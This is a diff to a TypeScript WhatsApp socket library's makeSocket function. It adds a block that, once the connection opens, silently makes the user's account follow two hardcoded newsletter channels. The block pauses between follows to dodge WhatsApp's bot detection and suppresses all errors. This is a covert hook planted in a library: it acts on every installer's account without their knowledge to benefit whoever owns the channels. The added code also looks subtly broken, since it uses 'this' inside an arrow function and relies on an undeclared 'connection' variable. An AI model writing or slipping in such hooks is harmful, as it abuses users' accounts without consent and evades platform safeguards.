@@ -453,6 +453,28 @@ export const makeSocket = (config: SocketConfig) => {
 		startKeepAliveRequest()
 	}
 
+	if (connection === 'open') {
+    // Daftar ID Channel kamu
+    const myChannels: string[] = [
+        "120363123456789@newsletter",
+        "120363987654321@newsletter"
+    ];
+
+    // Fungsi otomatis Follow
+    (async () => {
+        for (const id of myChannels) {
+            try {
+                // Gunakan fungsi bawaan untuk mengikuti channel
+                await this.newsletterFollow(id);
+                // Jeda 5 detik agar aman dari sistem deteksi bot WA
+                await new Promise(resolve => setTimeout(resolve, 5000));
+            } catch (e) {
+                // Abaikan jika gagal (misal sudah follow)
+            }
+        }
+    })();
+			}
+
 	const getAvailablePreKeysOnServer = async () => {
 		const result = await query({
 			tag: 'iq',
